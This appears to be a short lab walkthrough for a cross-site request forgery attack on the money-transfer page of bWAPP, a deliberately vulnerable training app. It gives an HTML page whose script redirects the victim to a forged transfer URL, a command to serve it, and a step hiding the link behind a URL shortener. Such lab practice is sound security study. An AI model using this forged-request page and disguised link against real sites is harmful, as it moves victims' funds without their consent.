1. Navigate to CSRF(Transfer Amount) in bWAPP press transfer and copy the url
2. Craft a malicious HTML page using the following code and insert parameters as you desire:

     <html>
	 	<script>
			document.onload = window.location.href = ["url"];
		</script>
	  </html>
	  
3. Open HTTP server via python to serve the page - python -m SimpleHTTPServer
4. Obfuscate the link using bitly